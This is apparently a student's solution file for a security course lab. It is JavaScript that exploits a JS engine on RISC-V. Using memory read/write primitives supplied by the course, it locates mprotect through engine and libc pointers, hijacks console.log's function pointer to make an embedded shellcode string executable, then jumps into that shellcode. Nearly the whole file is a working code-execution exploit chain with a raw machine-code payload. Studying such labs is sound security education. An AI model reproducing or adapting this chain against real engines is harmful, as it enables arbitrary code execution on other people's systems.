/*
 * TODO: Part C solution goes here!
 */
let second_stage = 
    "\xb7\x92\x39\x34\x9b\x82\x72\x7b\xb2\x02\x93\x82\xb2\x34\xb6\x02"
  + "\x93\x82\xf2\x22\x23\x3c\x51\xfe\x13\x05\x81\xff\x23\x38\x01\xfe"
  + "\x13\x06\x01\xff\x23\x34\xa1\xfe\x93\x05\x81\xfe\x93\x02\xb0\x03"
  + "\x73\x00\x00\x00";
/* RWX Mapping
 * use mprotect sys call 
 * mark a page on heap as rwx (PROT_READ | PROT_WRITE | PROT_EXEC)
 * hijack console.log
 * write memory to point to mprotect
 * NEED TO FIND WHERE MPROTECT IS
 */

// mf = offset 0, 32 bits
// ctx->rt->mf.js_malloc_usable_size
let addressconsole = cs361s.addrof(console.log);
let ctx = cs361s.readmem(addressconsole + 48);
let rt = cs361s.readmem(ctx + 24);
let jsMallocUsableSize = cs361s.readmem(rt + 24);

// auipc offset (top 20 is immediate)
let aupic_offset = cs361s.readmem(jsMallocUsableSize) >>> 12 << 12;
// ld offset (top 12 is immediate)
let ld_offset = cs361s.readmem(jsMallocUsableSize + 4) >> 20;
//get address of malloc usable size
let mallocUsableSizeAddress = cs361s.readmem(jsMallocUsableSize + aupic_offset + ld_offset);
//get address of mprotect by decrementing malloc usable size address
let addressmprotect = mallocUsableSizeAddress - 0x31B00; 

/* Populate with Second Stage Payload
 * Either mark the page that holds the second_stage string rwx or 
 * copy the string's contents into the page you have set up.
 * Then jump to the rwx copy of the second-stage payload to execute it.
 * Find where the second stage payload even is
 * look at text segment 
 */
let secondstageaddress = cs361s.addrof(second_stage);

//let old_realm = cs361s.readmem(addressconsole + 48);
cs361s.writemem(addressconsole + 48, secondstageaddress); // overwrite realm
cs361s.writemem(addressconsole + 56, addressmprotect);
console.log.apply(2.0237e-320, null); // rwx
// Execute Payload
//cs361s.writemem(addressconsole + 48, old_realm); // restore realm
cs361s.writemem(addressconsole + 56, secondstageaddress + 16); // start of string + 16 HAHAHAHAHHAHAHA
console.log();
